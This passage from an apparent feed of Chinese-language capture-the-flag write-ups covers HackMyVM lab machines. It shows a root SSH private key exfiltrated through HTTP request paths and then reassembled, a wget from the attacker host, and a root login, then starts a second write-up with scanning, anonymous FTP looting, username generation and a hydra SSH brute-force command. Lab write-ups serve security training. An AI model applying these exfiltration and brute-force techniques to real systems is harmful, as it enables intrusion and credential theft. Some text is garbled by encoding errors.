192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /Q8LMMwBq7zznq6FQf06WflATRhNc5wAAAAMBAAEAAAGAeX9uopbdvGx71wZUqo12iLOYLg HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /3a87DbhP2KPw5sRe0RNSO10xEwcVq0fUfQxFXhlh/VDN7Wr98J7b1RnZ5sCb+Y5lWH9iz2 HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /m6qvDDDNJZX2HWr6GX+tDhaWLt0MNY5xr64XtxLTipZxE0n2Hueel18jNldckI4aLbAKa/ HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /a4rL058j5AtMS6lBWFvqxZFLFr8wEECdBlGoWzkjGJkMTBsPLP8yzEnlipUxGgTR/3uSMN HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /peiKDzLI/Y+QcQku/7GmUIV4ugP0fjMnz/XcXqe6GVNX/gvNeT6WfKPCzcaXiF4I2i228u HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /TB9Ga5PNU2nYzJAQcAVvDwwC4IiNsDTdQY+cSOJ0KCcs2cq59EaOoZHY6Od88900V3MKFG HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /TwielzW1Nqq1ltaQYMtnILxzEeXJFp6LlqFTF4Phf/yUyK04a6mhFg3kJzsxE+iDOVH28D HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /Unj2OgO53KJ2FdLBHkUDlXMaDsISuizi0aj2MnhCryfHefhIsi1JdFyMhVuXCzNGUBAAAA HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /wQDlr9NWE6q1BovNNobebvw44NdBRQE/1nesegFqlVdtKM61gHYWJotvLV79rjjRfjnGHo HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /0MoSXZXiC/0/CSfe6Je7unnIzhiA85jSe/u2dIviqItTc2CBRtOZl7Vrflt7lasT7J1WAO HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /1ROwaN5uL26gIgtf/Y7Rhi0wFPN289UI2gjeVQKhXBObVm3qY7yZh8JpLPH5w0Xeuo20sP HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /WchZl0D8KSZUKhlPU6Pibqmj9bAAm7hwFecuQMeS+nxg1qIGYAAADBAOZ1XurOyyH9RWIo HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /0sTQ3d/kJNgTNHAs4Y0SxSOejC+N3tEU33GU3P+ppfHYy595rX7MX4o3gqXFpAaHRIAupr HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /DbenB1HQW4o6Gg+SF2GWPAQeuDbCsLM9P8XOiQIjTuCvYwHUdFD7nWMJ5Sqr6EeBV+CYw1 HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /Tg5PIU3FsnN5D3QOHVpGNo2qAvi+4CD0BC5fxOs6cZ1RBqbJ1kanw1H6fF8nRRBds+26Bl HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET //RGZHTBPLVenhNmWN2fje3GDBqVeIbZwAAAMEA2dfdjpefYEgtF0GMC9Sf5UzKIEKQMzoh HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /oxY6YRERurpcyYuSa/rxIP2uxu1yjIIcO4hpsQaoipTM0T9PS56CrO+FN9mcIcXCj5SVEq HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /2UVzu9LS0PdqPmniNmWglwvAbkktcEmbmCLYoh5GBxm9VhcL69dhzMdVe73Z9QhNXnMDlf HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /6xpD9lHWyp+ocD/meYC7V8aio/W9VxL25NlYwdFyCgecd/rIJQ+tGPXoqXIKrf5lVrVtFC HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /s8IoeeQHSidUKBAAAACnJvb3RAY3JhY2s= HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /-----END HTTP/1.1' 404 -

                                                                     
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ awk -F 'GET /' '{print $2}' tmp | awk -F ' HTTP/1.1' '{print $1}' | grep -v '^\s*$'
randomfile1
frand2
-----BEGIN
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
s8IoeeQHSidUKBAAAACnJvb3RAY3JhY2s=
-----END
                                                            
```

Â∞ΩÂäõ‰∫ÜÔºåËá™Â∑±ÂÜçÁºñËæë‰∏Ä‰∏ãÂêß

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
s8IoeeQHSidUKBAAAACnJvb3RAY3JhY2s=
-----END OPENSSH PRIVATE KEY-----

```

‰º†ËøáÂéªËØïËØï

```bash
cris@crack:~$ cd /tmp/                                                                                                                                                                       
cris@crack:/tmp$ wget 192.168.205.141/id_rsa                                                                                                                                                 
--2025-01-23 09:32:12--  http://192.168.205.141/id_rsa                                                                                                                                       
Conectando con 192.168.205.141:80... conectado.                                                                                                                                              
Petici√É¬≥n HTTP enviada, esperando respuesta... 200 OK                                                                                                                                         
Longitud: 2590 (2,5K) [application/octet-stream]                                                                                                                                             
Grabando a: √Ç¬´id_rsa√Ç¬ª                                                                                                                                                                         
                                                                                                                                                                                             
id_rsa                                          100%[======================================================================================================&gt;]   2,53K  --.-KB/s    en 0s     
                                                                                                                                                                                             
2025-01-23 09:32:12 (427 MB/s) - √Ç¬´id_rsa√Ç¬ª guardado [2590/2590]                                                                                                                               
                                                                                                                                                                                             
cris@crack:/tmp$ chmod 600 id_rsa                                                                                                                                                            
cris@crack:/tmp$ ssh root@127.0.0.1 -i id_rsa                                                                                                                                                
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.                                                                                                                       
ECDSA key fingerprint is SHA256:7z5F9pr6GN7gcEMbKUwipxWswKEpR9bMKOVzGc0V7/s.                                                                                                                 
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes                                                                                                                     
Warning: Permanently added '127.0.0.1' (ECDSA) to the list of known hosts.                                                                                                                   
Linux crack 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64                                                                                                                     
                                                                                                                                                                                             
The programs included with the Debian GNU/Linux system are free software;                                                                                                                    
the exact distribution terms for each program are described in the                                                                                                                           
individual files in /usr/share/doc/*/copyright.                                                                                                                                              
                                                                                                                                                                                             
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent                                                                                                                            
permitted by applicable law.                                                                                                                                                                 
Last login: Wed Jun  7 22:11:49 2023                                                                                                                                                         
root@crack:~# id                                                                                                                                                                             
uid=0(root) gid=0(root) grupos=0(root)                                                                                                                                                       
```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_crack.html</guid><pubDate>Fri, 27 Jun 2025 09:32:54 +0000</pubDate></item><item><title>hmv_CodeShield</title><link>https://7r1UMPHK.github.io/post/hmv_CodeShield.html</link><description># hmv_CodeShield

# 0.ÁÆÄ‰ªã

**Èù∂Êú∫**Ôºö[hackmyvm - CodeShield](https://hackmyvm.eu/machines/machine.php?vm=CodeShield)
**ÈöæÂ∫¶**ÔºöÁªøËâ≤
**ÁõÆÊ†á IP**Ôºö192.168.205.138
**Êú¨Êú∫ IP**Ôºö192.168.205.141

# 1.Êâ´Êèè

`nmap`Ëµ∑Êâã

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nmap -sS --min-rate 10000 -p- -Pn -sV 192.168.205.138
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-20 10:33 CST
Nmap scan report for 192.168.205.138
Host is up (0.046s latency).
Not shown: 65526 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           vsftpd 3.0.5
80/tcp    open  http          nginx
110/tcp   open  pop3          Dovecot pop3d
143/tcp   open  imap          Dovecot imapd (Ubuntu)
443/tcp   open  ssl/http      nginx
993/tcp   open  imaps?
995/tcp   open  pop3s?
3389/tcp  open  ms-wbt-server Microsoft Terminal Service
22222/tcp open  ssh           OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
MAC Address: 08:00:27:61:49:1F (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.22 seconds
```

ÂÖàÊääÊàë‰ª¨ÊÑüÂÖ¥Ë∂£ÁöÑÁ´ØÂè£ÊåëÂá∫Êù•`21„ÄÅ80„ÄÅ443„ÄÅ22222`ÔºåÁé∞Âú®Â∞±ËøôÂá†‰∏™ÔºåÂêéÈù¢Ê≤°ÊúâÂ§¥Áª™ÂÜçÊåë

# 2.Ë∏©ÁÇπ

ÊàëÊØîËæÉÂñúÊ¨¢ÂÖàÁúãftp21Á´ØÂè£„ÄÇÂÖàÂ∞ùËØïÂåøÂêçÁôªÂΩïÔºàÁî®Êà∑ÂêçÂíåÂØÜÁ†ÅÈÉΩÊòØ**anonymous**Ôºâ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/tmp]
‚îî‚îÄ$ ftp 192.168.205.138
Connected to 192.168.205.138.
220 (vsFTPd 3.0.5)
Name (192.168.205.138:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; ls -la
229 Entering Extended Passive Mode (|||5258|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        137          4096 Aug 30  2023 .
drwxr-xr-x    2 0        137          4096 Aug 30  2023 ..
-rw-rw-r--    1 1002     1002      2349914 Aug 30  2023 CodeShield_pitch_deck.pdf
-rw-rw-r--    1 1003     1003        67520 Aug 28  2023 Information_Security_Policy.pdf
-rw-rw-r--    1 1004     1004       226435 Aug 28  2023 The_2023_weak_password_report.pdf
226 Directory send OK.
ftp&gt; mget *
mget CodeShield_pitch_deck.pdf [anpqy?]? y
229 Entering Extended Passive Mode (|||47152|)
150 Opening BINARY mode data connection for CodeShield_pitch_deck.pdf (2349914 bytes).
100% |******************************************************************************************|  2294 KiB   76.68 MiB/s    00:00 ETA
226 Transfer complete.
2349914 bytes received in 00:00 (75.26 MiB/s)
mget Information_Security_Policy.pdf [anpqy?]? y
229 Entering Extended Passive Mode (|||40453|)
150 Opening BINARY mode data connection for Information_Security_Policy.pdf (67520 bytes).
100% |******************************************************************************************| 67520       38.67 MiB/s    00:00 ETA
226 Transfer complete.
67520 bytes received in 00:00 (30.61 MiB/s)
mget The_2023_weak_password_report.pdf [anpqy?]? y
229 Entering Extended Passive Mode (|||49281|)
150 Opening BINARY mode data connection for The_2023_weak_password_report.pdf (226435 bytes).
100% |******************************************************************************************|   221 KiB   17.71 MiB/s    00:00 ETA
226 Transfer complete.
226435 bytes received in 00:00 (16.96 MiB/s)

```

ÂéªÊñá‰ª∂ÁÆ°ÁêÜÂô®Êü•Áúã‰∏Ä‰∏ãËøô‰∏â‰∏™pdfÊñá‰ª∂

1. CodeShield_pitch_deck.pdf

   Âú®Êú´Â∞æÂèëË°å‰∫∫Âêç„ÄÅÈÇÆÁÆ±„ÄÅÁîµËØùÁ≠â‰ø°ÊÅØÔºåÊàë‰ª¨Êî∂ÈõÜËµ∑Êù•Áî®‰∫éÂêéÁª≠ÁöÑÁàÜÁ†¥

   ```bash
   Jessica Carlson
   j.carlson@codeshield.hmv
   206-555-0146
   CodeShield
   ```
2. Information_Security_Policy.pdf

   ‰∏Ä‰ªΩÂÆâÂÖ®ÊâãÂÜåÔºåÊúâCEOÁöÑÂêçÂ≠óÔºå‰ΩÜÊòØÊàë‰ª¨Â∑≤ÁªèÊî∂ÈõÜËøá‰∫Ü
3. The_2023_weak_password_report.pdf

   Êúâ‰∏Ä‰∏™ÂØÜÁ†ÅÊú¨ÔºåÊàë‰ª¨‰πüÊî∂ÈõÜ‰∏Ä‰∏ã

   ```bash
   Xxxxxxxxx001
   Password123!
   Greatplace2work!
   Diciembre@2017
   Hairdresser1!
   1qa2ws3ed4rf
   XXXX12345678
   Hairdresser1
   Xxxxxxxxx002
   Xxxxxxxxxx01
   ```

ftpÊúçÂä°ÁöÑË∏©ÁÇπÂà∞Ê≠§Âëä‰∏ÄÊÆµËêΩÔºåÊé•ÁùÄÊàë‰ª¨ÂéªÁúãÁúã80Á´ØÂè£„ÄÇ

![Image](https://github.com/user-attachments/assets/24ede8a5-40bb-426a-89f5-a4315fef09fa)

ÂÆÉÂä†ËΩΩÁöÑÁâπÂà´ÊÖ¢Ôºå‰Ω†ÂèØ‰ª•ÊääËøô‰∏§‰∏™Êã¶Êà™‰∏Ä‰∏ãÁÑ∂ÂêéÂà∑Êñ∞ÔºåÊàñËÄÖ‰Ω†Êää**burp**ÊâìÂºÄÔºåÂºÄ‰∏ä‰ª£ÁêÜ‰πüÂèØ‰ª•Ëß£ÂÜ≥ËøôÁßçÈóÆÈ¢ò

![Image](https://github.com/user-attachments/assets/9e82acfd-4587-4d74-9955-4dfdf6f5347a)

Â∞Ü‰∏äÈù¢ÁöÑ‰∫∫ÂêçÂä†ÂÖ•Êàë‰ª¨ÁöÑ**user**‰∏≠ÔºåÈúÄË¶ÅÊ≥®ÊÑèÁöÑÊòØÂÆÉÂú®**Ê≠£Êñá‰πüÈöêËóè‰∫Ü‰∏Ä‰∏™‰∫∫Âêç**

![Image](https://github.com/user-attachments/assets/2b3da8c1-a942-450f-9098-9d6c70ca519d)

```bash
Angelina Johnson
Jennifer Cruise
John Doe
Bob Watson
Mohammed Mansour
Xian Tan
Thomas Mitchell
Patrick Early
Kevin Valdez
```

ÊµÖÊµÖÊâ´‰∏Ä‰∏ãÊºèÊ¥ûÂíåÁõÆÂΩï

![Image](https://github.com/user-attachments/assets/4857fc94-ca7c-45ad-911f-6e563f437263)

ÂèëÁé∞‰∫Ü‰∏Ä‰∏™`mail`Ôºå‰ΩÜÊòØËøô‰∏™ÊàëËÆ∞ÂæóÊ≤°ÊúâÊ¥ûÔºåÂÄíÊòØÂèØ‰ª•ÁàÜÁ†¥ÔºåÂêéÈù¢ÂÜçËØï„ÄÇÁõÆÂâçÊù•ÁúãÂ∫îËØ•ÊòØÁàÜÁ†¥sshÊúçÂä°Ôºå‰ΩÜÊòØÊàë‰ª¨ÁõÆÂâçÊî∂ÈõÜÁöÑÁî®Êà∑ÂêçÊòØÊó†Ê≥ïÁõ¥Êé•‰ΩøÁî®ÁöÑÔºåÈúÄË¶ÅËøõË°åËΩ¨Êç¢

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/tmp]
‚îî‚îÄ$ cat user.py  
import sys

def generate_usernames(names):
    usernames = []

    for name in names:
        parts = name.split()
        if len(parts) &lt; 2:
            print(f'Skipping invalid name: {name}')
            continue  # Â¶ÇÊûúÂêçÂ≠ó‰∏çÁ¨¶ÂêàÊ†ºÂºèÔºàÊ≤°ÊúâÂßìÊ∞èÔºâÔºåÂàôË∑≥ËøáËøô‰∏ÄË°å
      
        usernames.append(parts[0][0].lower() + parts[1].lower())  # ÂßìÂêçÁº©ÂÜô + ÂßìÊ∞è
        usernames.append(parts[0].lower() + parts[1].lower())  # ÂÖ®Âêç
        usernames.append(parts[1].lower() + parts[0][0].lower())  # ÂßìÊ∞è + ÂßìÂêçÈ¶ñÂ≠óÊØç
        usernames.append(parts[0].lower())  # Âè™Áî®ÂêçÂ≠ó
        usernames.append(parts[1].lower())  # Âè™Áî®ÂßìÊ∞è

        usernames.append(parts[0][0].lower() + '.' + parts[1].lower())  # 'j.carlson'

    return usernames

def read_names_from_file(file_path):
    with open(file_path, 'r') as f:
        names = f.readlines()
    # ÂéªÈô§ÊØèË°åÊú´Â∞æÁöÑÊç¢Ë°åÁ¨¶
    return [name.strip() for name in names]

def main():
    if len(sys.argv) != 2:
        print('Usage: python3 a.py &lt;filename&gt;')
        sys.exit(1)

    # ‰ªéÂëΩ‰ª§Ë°åÂèÇÊï∞Ëé∑ÂèñÊñá‰ª∂Ë∑ØÂæÑ
    file_path = sys.argv[1]
    try:
        # ËØªÂèñÊñá‰ª∂‰∏≠ÁöÑÂêçÂ≠ó
        names = read_names_from_file(file_path)
        # ÁîüÊàêÁî®Êà∑ÂêçÂàóË°®
        usernames = generate_usernames(names)
        # ÊâìÂç∞ÁîüÊàêÁöÑÁî®Êà∑Âêç
        for username in usernames:
            print(username)
    except FileNotFoundError:
        print(f'Error: The file {file_path} was not found.')
        sys.exit(1)

if __name__ == '__main__':
    main()

‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/tmp]
‚îî‚îÄ$ cat user   
Angelina Johnson
Jennifer Cruise
John Doe
Bob Watson
Mohammed Mansour
Xian Tan
Thomas Mitchell
Patrick Early
Kevin Valdez
j.carlson

‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/tmp]
‚îî‚îÄ$ python3 user.py user &gt;&gt; user
                                                                                                                                    
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/tmp]
‚îî‚îÄ$ cat user
Angelina Johnson
Jennifer Cruise
John Doe
Bob Watson
Mohammed Mansour
Xian Tan
Thomas Mitchell
Patrick Early
Kevin Valdez
j.carlson
Skipping invalid name: j.carlson
ajohnson
angelinajohnson
johnsona
angelina
johnson
a.johnson
jcruise
jennifercruise
cruisej
jennifer
cruise
j.cruise
jdoe
johndoe
doej
john
doe
j.doe
bwatson
bobwatson
watsonb
bob
watson
b.watson
mmansour
mohammedmansour
mansourm
mohammed
mansour
m.mansour
xtan
xiantan
tanx
xian
tan
x.tan
tmitchell
thomasmitchell
mitchellt
thomas
mitchell
t.mitchell
pearly
patrickearly
earlyp
patrick
early
p.early
kvaldez
kevinvaldez
valdezk
kevin
valdez
k.valdez

‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/tmp]
‚îî‚îÄ$ cat pass                        
Xxxxxxxxx001
Password123!
Greatplace2work!
Diciembre@2017
Hairdresser1!
1qa2ws3ed4rf
XXXX12345678
Hairdresser1
Xxxxxxxxx002
Xxxxxxxxxx01
```

ÂÖàÂ∞ùËØïÁàÜÁ†¥**sshÊúçÂä°**

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/tmp]
‚îî‚îÄ$ hydra -L user -P pass ssh://192.168.205.138 -I -u -f -e nsr -t 64 -s 22222 
